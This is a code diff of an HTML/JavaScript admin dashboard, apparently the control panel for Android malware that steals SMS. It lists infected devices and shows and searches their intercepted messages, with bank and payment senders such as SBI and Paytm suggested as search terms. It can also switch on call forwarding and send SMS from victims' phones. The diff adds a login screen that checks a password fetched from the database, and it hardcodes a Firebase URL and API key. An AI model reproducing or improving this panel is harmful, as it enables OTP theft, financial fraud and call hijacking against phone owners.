@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>CSC Admin Dashboard - No Password</title>
+<title>CSC Admin - Complete Working Dashboard</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
 :root{
@@ -25,6 +25,14 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .fg input:focus{border-color:var(--purple2);}
 .pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;}
 .errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
+
+#login-screen{min-height:100vh;display:none;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
+.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
+.login-card .ic{font-size:44px;}
+.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
+.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
+.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:18px;text-align:center;letter-spacing:3px;outline:none;margin-bottom:14px;}
+.login-card input:focus{border-color:var(--purple2);}
 
 #app{display:none;flex-direction:column;min-height:100vh;}
 .topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;}
@@ -61,52 +69,7 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .son{color:var(--green);}
 .soff{color:var(--red);}
 .sbadge{background:var(--purple-light);color:var(--purple);font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;margin-left:auto;}
-</style>
-</head>
-<body>
-  <!-- SETUP SCREEN (Only config, no login) -->
-<div id="setup-screen">
-  <div class="setup-card">
-    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
-    <div class="fg"><label>Firebase Database URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
-    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
-    <div class="fg"><label>Main Node</label><input id="cfg-node" value="csc6"></div>
-    <button class="pbtn" onclick="doConnect()">🔗 Connect & Open Dashboard</button>
-    <div class="errbox" id="setup-err"></div>
-  </div>
-</div>
 
-<!-- MAIN DASHBOARD APP -->
-<div id="app">
-  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="disconnect()">Disconnect</button></div></div>
-  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
-  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
-</div>
-
-<!-- DETAIL SCREEN -->
-<div id="detail-screen">
-  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
-  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
-  <div class="sms-list-wrap" id="sms-list"></div>
-</div>
-
-<!-- SEARCH RESULTS SCREEN -->
-<div id="search-screen">
-  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
-  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
-  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
-</div>
-
-<!-- DIALOGS -->
-<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
-
-<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
-
-<div id="toast"></div>
-
-<style>
 #detail-screen{display:none;flex-direction:column;min-height:100vh;}
 .dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;}
 .bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;cursor:pointer;}
@@ -144,17 +107,74 @@ body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);}
 .sim-rb.chk{border-color:var(--purple2);}
 .sim-rb.chk::after{content:'';display:block;width:8px;height:8px;border-radius:50%;background:var(--purple2);margin:2px;}
 .cf-res{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;border-radius:8px;padding:9px 13px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}
+
 .loading{display:flex;justify-content:center;padding:48px;gap:11px;color:var(--muted);}
 .spinner{width:21px;height:21px;border:2.5px solid var(--border);border-top-color:var(--purple2);border-radius:50%;animation:spin .8s linear infinite;}
 @keyframes spin{to{transform:rotate(360deg);}}
 .empty{text-align:center;padding:48px 16px;color:var(--muted);}
 .empty .ei{font-size:38px;margin-bottom:10px;opacity:.5;}
 #toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 20px;border-radius:20px;font-size:13px;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap;}
-  </style>
-  <script>
-// ========== NO PASSWORD - DIRECT CONNECT ==========
-var DB_URL = '', API_KEY = '', ROOT_NODE = 'csc6';
-var DEVICES = {};
+</style>
+</head>
+<body>
+  <!-- SETUP SCREEN -->
+<div id="setup-screen">
+  <div class="setup-card">
+    <div class="setup-logo"><div class="ic">📡</div><h1>CSC Admin</h1><p>Firebase Configuration</p></div>
+    <div class="fg"><label>Firebase URL</label><input id="cfg-url" placeholder="https://your-db.firebaseio.com" value="https://vkvkvk-61f36-default-rtdb.firebaseio.com/"></div>
+    <div class="fg"><label>API Key</label><input id="cfg-key" type="password" placeholder="AIzaSy..." value="AIzaSyAniMS9v56_LHDoYg3eqyjjJAWeNUHOias"></div>
+    <button class="pbtn" onclick="saveConfig()">Save & Continue</button>
+    <div class="errbox" id="setup-err"></div>
+  </div>
+</div>
+
+<!-- LOGIN SCREEN -->
+<div id="login-screen">
+  <div class="login-card">
+    <div class="ic">🔐</div>
+    <h2>Admin Login</h2>
+    <p>Enter Admin Password</p>
+    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
+    <button class="pbtn" onclick="doLogin()">Login</button>
+    <div class="errbox" id="login-err"></div>
+  </div>
+</div>
+
+<!-- MAIN APP DASHBOARD -->
+<div id="app">
+  <div class="topbar"><div class="topbar-title"><span class="live-dot"></span> CSC Admin</div><div><button class="xbtn" onclick="refreshData()">🔄</button><button class="xbtn" onclick="logout()">Logout</button></div></div>
+  <div class="search-sec"><div class="sw"><span class="si">🔍</span><input id="global-search" placeholder="Search SMS in ALL devices (SBI, Paytm, Nearby, Spice)..." oninput="onSearch(this.value)" /><button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button></div></div>
+  <div id="main-content"><div class="reg-bar" id="register-bar">Devices: --</div><button class="upd-btn" onclick="openUpdateNo()">📱 UPDATE NUMBER</button><div class="stats-bar"><div class="sbox"><div class="snum" id="s-total">0</div><div class="slbl">Devices</div></div><div class="sbox"><div class="snum" id="s-online">0</div><div class="slbl">Online</div></div><div class="sbox"><div class="snum" id="s-sms">0</div><div class="slbl">Total SMS</div></div></div><div class="dev-list" id="device-list"><div class="loading"><div class="spinner"></div> Loading devices...</div></div></div>
+</div>
+
+<!-- DETAIL SCREEN -->
+<div id="detail-screen">
+  <div class="dtopbar"><button class="bbtn" onclick="goBack()">← Back</button><div class="dtitle" id="detail-title">Device</div></div>
+  <div class="dactions"><button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button><button class="actbtn" onclick="openSmsSend()">✉️ SEND SMS</button></div>
+  <div class="sms-list-wrap" id="sms-list"></div>
+</div>
+
+<!-- SEARCH RESULTS SCREEN -->
+<div id="search-screen">
+  <div class="topbar"><div class="topbar-title">🔍 Search Results</div><button class="xbtn" onclick="clearSearch()">← Back to Dashboard</button></div>
+  <div style="padding:11px 16px;background:#fff;border-bottom:1px solid var(--border);" id="search-summary"></div>
+  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
+</div>
+
+<!-- DIALOGS -->
+<div class="overlay" id="dlg-cf"><div class="dialog"><div class="dhdr">📞 Call Forwarding</div><div class="dbody"><div id="sim-list"></div><div class="fwd-lbl">Forward To Number</div><input class="dinput" id="cf-number" placeholder="+91XXXXXXXXXX" type="tel" /><div class="dbtn-row"><button class="dbtn-h" onclick="doCF('active')">ACTIVATE</button><button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVATE</button></div><button class="dbtn" onclick="doCF('check')">CHECK STATUS</button><div class="cf-res" id="cf-result"></div><button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-sms"><div class="dialog"><div class="dhdr">✉️ Send SMS</div><div class="dbody"><input class="dinput" id="sms-to" placeholder="Recipient Number" type="tel" /><textarea class="dinput" id="sms-msg" placeholder="Message" rows="4"></textarea><button class="dbtn" onclick="doSendSms()">SEND</button><button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button></div></div></div>
+
+<div class="overlay" id="dlg-update"><div class="dialog"><div class="dhdr">🔄 Update Number</div><div class="dbody"><input class="dinput" id="update-num" placeholder="New Number" type="tel" /><button class="dbtn" onclick="doUpdateNo()">UPDATE</button><button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button></div></div></div>
+
+<div id="toast"></div>
+<script>
+// ========== GLOBAL VARIABLES ==========
+var DB_URL = '', API_KEY = '';
+var ADMIN_PASSWORD = '';
+var DEVICES_LIST = [];      // verify_device se device IDs
+var DEVICES_DATA = {};      // all data per device
 var currentDeviceKey = null;
 var selectedSim = 0;
 var pollTimer = null;
@@ -175,11 +195,10 @@ function fbSet(path, data) {
   }).then(function(r) { return r.json(); });
 }
 
-// ========== DIRECT CONNECT (NO PASSWORD) ==========
-function doConnect() {
+// ========== SAVE CONFIG ==========
+function saveConfig() {
   DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/, '');
   API_KEY = document.getElementById('cfg-key').value.trim();
-  ROOT_NODE = document.getElementById('cfg-node').value.trim() || 'csc6';
   
   if (!DB_URL || !API_KEY) {
     showSetupErr('Please enter both URL and API Key');
@@ -188,21 +207,28 @@ function doConnect() {
   
   var btn = event.target;
   btn.disabled = true;
-  btn.textContent = 'Connecting...';
+  btn.textContent = 'Checking...';
   
-  // Directly fetch All_User to verify connection
-  fbGet(ROOT_NODE + '/All_User').then(function(data) {
+  // Fetch Admin Password from csc6/Admin_Password
+  fbGet('csc6/Admin_Password').then(function(password) {
+    if (!password) {
+      showSetupErr('Admin_Password not found in csc6/Admin_Password');
+      btn.disabled = false;
+      btn.textContent = 'Save & Continue';
+      return;
+    }
+    ADMIN_PASSWORD = String(password);
     document.getElementById('setup-screen').style.display = 'none';
-    document.getElementById('app').style.display = 'flex';
-    loadData();
-    startPolling();
+    document.getElementById('login-screen').style.display = 'flex';
+    document.getElementById('login-pass').value = '';
+    document.getElementById('login-pass').focus();
     btn.disabled = false;
-    btn.textContent = '🔗 Connect & Open Dashboard';
-    showToast('Connected successfully!');
+    btn.textContent = 'Save & Continue';
+    showToast('Configuration saved! Please login.');
   }).catch(function(e) {
-    showSetupErr('Connection failed: ' + e.message + ' — Check URL/API Key');
+    showSetupErr('Connection failed: ' + e.message);
     btn.disabled = false;
-    btn.textContent = '🔗 Connect & Open Dashboard';
+    btn.textContent = 'Save & Continue';
   });
 }
 
@@ -213,116 +239,164 @@ function showSetupErr(msg) {
   setTimeout(function() { err.style.display = 'none'; }, 4000);
 }
 
-function disconnect() {
+// ========== LOGIN ==========
+function doLogin() {
+  var pass = document.getElementById('login-pass').value;
+  if (pass === ADMIN_PASSWORD) {
+    document.getElementById('login-screen').style.display = 'none';
+    document.getElementById('app').style.display = 'flex';
+    loadAllData();
+    startPolling();
+    showToast('Login successful!');
+  } else {
+    var err = document.getElementById('login-err');
+    err.textContent = '❌ Wrong password!';
+    err.style.display = 'block';
+    setTimeout(function() { err.style.display = 'none'; }, 3000);
+  }
+}
+
+function logout() {
   stopPolling();
   document.getElementById('app').style.display = 'none';
   document.getElementById('detail-screen').style.display = 'none';
   document.getElementById('search-screen').style.display = 'none';
-  document.getElementById('setup-screen').style.display = 'flex';
-  showToast('Disconnected');
+  document.getElementById('login-screen').style.display = 'flex';
+  document.getElementById('login-pass').value = '';
+  showToast('Logged out');
 }
-    // ========== LOAD DATA ==========
-function loadData() {
-  fbGet(ROOT_NODE + '/All_User').then(function(data) {
-    if (!data) {
-      document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices found in ' + ROOT_NODE + '/All_User</p></div>';
-      DEVICES = {};
+  // ========== LOAD ALL DATA ==========
+function loadAllData() {
+  // Step 1: Get all device IDs from verify_device
+  fbGet('verify_device').then(function(devices) {
+    if (!devices) {
+      document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices found in verify_device</p></div>';
+      DEVICES_LIST = [];
       updateStats();
       return;
     }
     
-    DEVICES = {};
-    var totalSms = 0, online = 0;
+    DEVICES_LIST = Object.keys(devices);
+    console.log('Devices found:', DEVICES_LIST.length);
     
-    Object.entries(data).forEach(function(entry) {
-      var deviceId = entry[0];
-      var deviceData = entry[1];
-      if (typeof deviceData !== 'object' || !deviceData) return;
-      
-      var info = deviceData.Info || {};
-      var smsRaw = deviceData.Sms || {};
-      var sim = deviceData.SimINFO || deviceData.SimInfo || {};
-      var smsArr = objToArr(smsRaw);
-      totalSms += smsArr.length;
-      
-      var statusText = String(info.Status || deviceData.Status || '').toLowerCase();
-      var isOnline = (statusText === 'online' || statusText === '1' || statusText === 'true');
-      if (isOnline) online++;
-      
-      DEVICES[deviceId] = {
-        key: deviceId,
-        name: info.MobileName || info.mobileName || info.DeviceName || info.name || deviceId,
-        id: info.DeviceId || info.deviceId || deviceId,
-        battery: info.Battery || info.battery || '—',
-        status: isOnline ? 'online' : 'offline',
-        sms: smsArr,
-        simInfo: sim,
-        callFor: deviceData.Call_For || {},
-        raw: deviceData
-      };
+    // Step 2: For each device, fetch its data from all_user nodes
+    var promises = [];
+    DEVICES_LIST.forEach(function(deviceId) {
+      promises.push(fetchDeviceData(deviceId));
     });
     
-    updateStats();
-    renderDeviceList();
-    
-    if (currentDeviceKey && document.getElementById('detail-screen').style.display === 'flex') {
-      renderSmsList(currentDeviceKey);
-    }
-    
-    var searchQuery = document.getElementById('global-search').value.trim();
-    if (searchQuery) {
-      runSearch(searchQuery);
-    }
+    Promise.all(promises).then(function() {
+      renderDeviceList();
+      updateStats();
+      
+      var searchQuery = document.getElementById('global-search').value.trim();
+      if (searchQuery) {
+        runSearch(searchQuery);
+      }
+    }).catch(function(e) {
+      showToast('Error loading device data: ' + e.message);
+    });
   }).catch(function(e) {
-    showToast('Load error: ' + e.message);
+    showToast('Error loading verify_device: ' + e.message);
+    document.getElementById('device-list').innerHTML = '<div class="empty"><div class="ei">📱</div><p>Error loading devices</p></div>';
   });
 }
 
-function updateStats() {
-  document.getElementById('s-total').textContent = Object.keys(DEVICES).length;
-  var onlineCount = Object.values(DEVICES).filter(function(d) { return d.status === 'online'; }).length;
-  document.getElementById('s-online').textContent = onlineCount;
-  var totalSms = Object.values(DEVICES).reduce(function(sum, d) { return sum + d.sms.length; }, 0);
-  document.getElementById('s-sms').textContent = totalSms;
-  
-  var anyDev = Object.values(DEVICES)[0];
-  if (anyDev && anyDev.raw && anyDev.raw.Data && anyDev.raw.Data.RegisterDate) {
-    document.getElementById('register-bar').textContent = '📅 Register Date: ' + anyDev.raw.Data.RegisterDate;
-  } else {
-    document.getElementById('register-bar').textContent = 'Total Devices: ' + Object.keys(DEVICES).length;
-  }
+function fetchDeviceData(deviceId) {
+  // Fetch all data for a device from different nodes in all_user
+  return Promise.all([
+    fbGet('csc6/all_user/Info/' + deviceId),
+    fbGet('csc6/all_user/Sms/' + deviceId),
+    fbGet('csc6/all_user/SimINFO/' + deviceId),
+    fbGet('csc6/all_user/Call_For/' + deviceId),
+    fbGet('csc6/all_user/Data/' + deviceId),
+    fbGet('csc6/all_user/Forwad_Status/' + deviceId),
+    fbGet('csc6/all_user/User/' + deviceId)
+  ]).then(function(results) {
+    var info = results[0] || {};
+    var smsRaw = results[1] || {};
+    var simInfo = results[2] || {};
+    var callFor = results[3] || {};
+    var data = results[4] || {};
+    var fwdStatus = results[5] || {};
+    var user = results[6] || {};
+    
+    var smsArr = objToArr(smsRaw);
+    var statusText = String(info.Status || '').toLowerCase();
+    var isOnline = (statusText === 'online' || statusText === '1' || statusText === 'true');
+    
+    DEVICES_DATA[deviceId] = {
+      key: deviceId,
+      name: info.MobileName || info.mobileName || info.DeviceName || info.name || deviceId,
+      id: info.DeviceId || info.deviceId || deviceId,
+      battery: info.Battery || info.battery || '—',
+      status: isOnline ? 'online' : 'offline',
+      sms: smsArr,
+      simInfo: simInfo,
+      callFor: callFor,
+      data: data,
+      fwdStatus: fwdStatus,
+      user: user,
+      rawInfo: info
+    };
+  });
 }
 
 function refreshData() {
-  loadData();
+  loadAllData();
   showToast('🔄 Refreshed!');
 }
 
 function startPolling() {
   stopPolling();
-  pollTimer = setInterval(loadData, 10000);
+  pollTimer = setInterval(loadAllData, 15000);
 }
 
 function stopPolling() {
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
 }
 
+function updateStats() {
+  document.getElementById('s-total').textContent = DEVICES_LIST.length;
+  var onlineCount = 0;
+  var totalSms = 0;
+  for (var i = 0; i < DEVICES_LIST.length; i++) {
+    var dev = DEVICES_DATA[DEVICES_LIST[i]];
+    if (dev && dev.status === 'online') onlineCount++;
+    if (dev && dev.sms) totalSms += dev.sms.length;
+  }
+  document.getElementById('s-online').textContent = onlineCount;
+  document.getElementById('s-sms').textContent = totalSms;
+  
+  var anyDev = DEVICES_DATA[DEVICES_LIST[0]];
+  if (anyDev && anyDev.data && anyDev.data.RegisterDate) {
+    document.getElementById('register-bar').textContent = '📅 Register Date: ' + anyDev.data.RegisterDate;
+  } else {
+    document.getElementById('register-bar').textContent = 'Total Devices: ' + DEVICES_LIST.length;
+  }
+}
+
 // ========== RENDER DEVICE LIST ==========
 function renderDeviceList() {
   var container = document.getElementById('device-list');
-  var devs = Object.values(DEVICES);
   
-  if (!devs.length) {
+  if (DEVICES_LIST.length === 0) {
     container.innerHTML = '<div class="empty"><div class="ei">📱</div><p>No devices available</p></div>';
     return;
   }
   
-  container.innerHTML = devs.map(function(d, i) {
+  var html = '';
+  for (var i = 0; i < DEVICES_LIST.length; i++) {
+    var deviceId = DEVICES_LIST[i];
+    var d = DEVICES_DATA[deviceId];
+    if (!d) continue;
+    
     var batteryHtml = (d.battery && d.battery !== '—') ? '<div class="dbat">🔋 Battery: ' + escapeHtml(d.battery) + '%</div>' : '';
     var statusClass = d.status === 'online' ? 'son' : 'soff';
     var statusText = d.status === 'online' ? 'Online User' : 'Offline User';
+    var smsCount = d.sms ? d.sms.length : 0;
     
-    return '<div class="dev-card" onclick="openDevice(\'' + escapeHtml(d.key) + '\')">' +
+    html += '<div class="dev-card" onclick="openDevice(\'' + escapeHtml(deviceId) + '\')">' +
       '<div class="dct">' +
       '<div class="dnum">' + (i + 1) + '</div>' +
       '<div class="dic">📱</div>' +
@@ -331,47 +405,50 @@ function renderDeviceList() {
       '<div class="did">ID: ' + escapeHtml(d.id) + '</div>' +
       batteryHtml +
       '</div>' +
-      '<div class="sbadge">💬 ' + d.sms.length + '</div>' +
+      '<div class="sbadge">💬 ' + smsCount + '</div>' +
       '</div>' +
       '<div class="dstat ' + statusClass + '">Status: ' + statusText + '</div>' +
       '</div>';
-  }).join('');
-}
-
-// ========== DEVICE DETAIL ==========
-function openDevice(key) {
-  currentDeviceKey = key;
+  }
+  container.innerHTML = html;
+       }
+  // ========== DEVICE DETAIL ==========
+function openDevice(deviceId) {
+  currentDeviceKey = deviceId;
   document.getElementById('app').style.display = 'none';
   document.getElementById('search-screen').style.display = 'none';
   var detailScreen = document.getElementById('detail-screen');
   detailScreen.style.display = 'flex';
-  var dev = DEVICES[key];
-  document.getElementById('detail-title').textContent = dev ? escapeHtml(dev.name) : key;
-  renderSmsList(key);
+  var dev = DEVICES_DATA[deviceId];
+  document.getElementById('detail-title').textContent = dev ? escapeHtml(dev.name) : deviceId;
+  renderSmsList(deviceId);
   window.scrollTo(0, 0);
 }
 
-function renderSmsList(deviceKey) {
-  var dev = DEVICES[deviceKey];
+function renderSmsList(deviceId) {
+  var dev = DEVICES_DATA[deviceId];
   var container = document.getElementById('sms-list');
   
-  if (!dev || !dev.sms.length) {
+  if (!dev || !dev.sms || dev.sms.length === 0) {
     container.innerHTML = '<div class="empty"><div class="ei">💬</div><p>No SMS messages for this device</p></div>';
     return;
   }
   
   var sorted = [].concat(dev.sms).sort(function(a, b) { return getTimestamp(b) - getTimestamp(a); });
   
-  container.innerHTML = sorted.map(function(s) {
+  var html = '';
+  for (var i = 0; i < sorted.length; i++) {
+    var s = sorted[i];
     var addr = s.address || s.sender || s.from || s.number || s.Address || 'Unknown';
     var body = s.body || s.message || s.text || s.content || s.Body || s.Message || '';
     var timeVal = s.date || s.timestamp || s.time || s.Date || '';
-    return '<div class="scard">' +
+    html += '<div class="scard">' +
       '<div class="sadr">📞 From: ' + escapeHtml(String(addr)) + '</div>' +
       '<div class="sbody">' + escapeHtml(String(body)) + '</div>' +
       '<div class="stime">🕒 ' + formatDate(timeVal) + '</div>' +
       '</div>';
-  }).join('');
+  }
+  container.innerHTML = html;
 }
 
 function goBack() {
@@ -383,8 +460,9 @@ function goBack() {
     document.getElementById('app').style.display = 'flex';
   }
   window.scrollTo(0, 0);
-    }
-    // ========== GLOBAL SEARCH - ALL DEVICES ==========
+}
+
+// ========== GLOBAL SEARCH - ALL DEVICES ==========
 function onSearch(val) {
   var clearBtn = document.getElementById('search-clear-btn');
   clearBtn.style.display = val ? 'block' : 'none';
@@ -405,13 +483,21 @@ function runSearch(keyword) {
   var keywordLower = keyword.toLowerCase();
   var results = [];
   
-  // Search through ALL devices
-  Object.values(DEVICES).forEach(function(device) {
-    var matchedSms = device.sms.filter(function(sms) {
+  // Search through ALL devices' SMS
+  for (var i = 0; i < DEVICES_LIST.length; i++) {
+    var deviceId = DEVICES_LIST[i];
+    var device = DEVICES_DATA[deviceId];
+    if (!device || !device.sms) continue;
+    
+    var matchedSms = [];
+    for (var j = 0; j < device.sms.length; j++) {
+      var sms = device.sms[j];
       var body = (sms.body || sms.message || sms.text || sms.content || sms.Body || sms.Message || '').toLowerCase();
       var addr = (sms.address || sms.sender || sms.from || sms.number || sms.Address || '').toLowerCase();
-      return body.includes(keywordLower) || addr.includes(keywordLower);
-    });
+      if (body.includes(keywordLower) || addr.includes(keywordLower)) {
+        matchedSms.push(sms);
+      }
+    }
     
     if (matchedSms.length > 0) {
       results.push({
@@ -419,9 +505,13 @@ function runSearch(keyword) {
         matches: matchedSms
       });
     }
-  });
+  }
   
-  var totalMatches = results.reduce(function(sum, r) { return sum + r.matches.length; }, 0);
+  var totalMatches = 0;
+  for (var i = 0; i < results.length; i++) {
+    totalMatches += results[i].matches.length;
+  }
+  
   var summaryText = results.length > 0 
     ? '🔎 "' + escapeHtml(keyword) + '" — Found in ' + results.length + ' device(s), total ' + totalMatches + ' SMS messages'
     : '🔎 "' + escapeHtml(keyword) + '" — No matching SMS found in any device';
@@ -430,24 +520,29 @@ function runSearch(keyword) {
   var container = document.getElementById('search-results-list');
   
   if (results.length === 0) {
-    container.innerHTML = '<div class="empty"><div class="ei">🔍</div><p>No SMS found with keyword: "' + escapeHtml(keyword) + '"</p><p style="font-size:12px;margin-top:10px;">Try: SBI, Paytm, Nearby, Spice, etc.</p></div>';
+    container.innerHTML = '<div class="empty"><div class="ei">🔍</div><p>No SMS found with keyword: "' + escapeHtml(keyword) + '"</p></div>';
     return;
   }
   
-  container.innerHTML = results.map(function(result) {
-    var previewSms = result.matches.slice(0, 3).map(function(sms) {
+  var html = '';
+  for (var i = 0; i < results.length; i++) {
+    var result = results[i];
+    var previewSms = '';
+    var maxPreview = Math.min(3, result.matches.length);
+    for (var j = 0; j < maxPreview; j++) {
+      var sms = result.matches[j];
       var addr = sms.address || sms.sender || sms.from || sms.number || sms.Address || '';
       var body = sms.body || sms.message || sms.text || sms.content || sms.Body || sms.Message || '';
-      return '<div class="scard" style="margin-bottom:8px;padding:10px;">' +
+      previewSms += '<div class="scard" style="margin-bottom:8px;padding:10px;">' +
         '<div class="sadr" style="font-size:12px;">📞 ' + escapeHtml(String(addr)) + '</div>' +
         '<div class="sbody" style="font-size:12px;">' + highlightText(escapeHtml(String(body)), keyword) + '</div>' +
         '</div>';
-    }).join('');
+    }
     
     var moreCount = result.matches.length - 3;
     var moreHtml = moreCount > 0 ? '<div style="font-size:12px;color:var(--purple);text-align:center;padding:8px 0 4px;">+' + moreCount + ' more SMS — Tap to view all</div>' : '';
     
-    return '<div class="src-card" onclick="openDevice(\'' + escapeHtml(result.device.key) + '\')">' +
+    html += '<div class="src-card" onclick="openDevice(\'' + escapeHtml(result.device.key) + '\')">' +
       '<div style="display:flex;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px;">' +
       '<span class="sdlbl">📱 ' + escapeHtml(result.device.name) + '</span>' +
       '<span class="smcnt">' + result.matches.length + ' SMS matched</span>' +
@@ -455,7 +550,8 @@ function runSearch(keyword) {
       previewSms +
       moreHtml +
       '</div>';
-  }).join('');
+  }
+  container.innerHTML = html;
 }
 
 function clearSearch() {
@@ -472,10 +568,10 @@ function highlightText(text, keyword) {
   } catch(e) {
     return text;
   }
-        }
-    // ========== CALL FORWARDING ==========
+}
+  // ========== CALL FORWARDING ==========
 function openCallFwd() {
-  var dev = DEVICES[currentDeviceKey];
+  var dev = DEVICES_DATA[currentDeviceKey];
   if (!dev) { showToast('Device not found'); return; }
   
   var sims = dev.simInfo || {};
@@ -483,7 +579,8 @@ function openCallFwd() {
   var html = '';
   
   if (keys.length) {
-    keys.slice(0, 2).forEach(function(k, i) {
+    for (var i = 0; i < Math.min(2, keys.length); i++) {
+      var k = keys[i];
       var s = sims[k];
       var num = s.number || s.phoneNumber || s.Number || s.SimNumber || '—';
       var op = s.operator || s.carrier || s.Operator || '—';
@@ -491,7 +588,7 @@ function openCallFwd() {
         '<div class="sim-ic">📶</div>' +
         '<div class="sim-inf"><div class="sim-nm">SIM ' + (i + 1) + '</div><div class="sim-no">' + escapeHtml(String(num)) + ' · ' + escapeHtml(String(op)) + '</div></div>' +
         '<div class="sim-rb' + (i === selectedSim ? ' chk' : '') + '"></div></div>';
-    });
+    }
   } else {
     html = '<div class="sim-opt sel" onclick="selectSim(0)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 1</div><div class="sim-no">Default SIM</div></div><div class="sim-rb chk"></div></div>' +
       '<div class="sim-opt" onclick="selectSim(1)"><div class="sim-ic">📶</div><div class="sim-inf"><div class="sim-nm">SIM 2</div><div class="sim-no">Not available</div></div><div class="sim-rb"></div></div>';
@@ -505,18 +602,19 @@ function openCallFwd() {
 
 function selectSim(i) {
   selectedSim = i;
-  document.querySelectorAll('.sim-opt').forEach(function(el, j) {
-    el.classList.toggle('sel', j === i);
-    var rb = el.querySelector('.sim-rb');
+  var simOpts = document.querySelectorAll('.sim-opt');
+  for (var j = 0; j < simOpts.length; j++) {
+    simOpts[j].classList.toggle('sel', j === i);
+    var rb = simOpts[j].querySelector('.sim-rb');
     if (rb) rb.classList.toggle('chk', j === i);
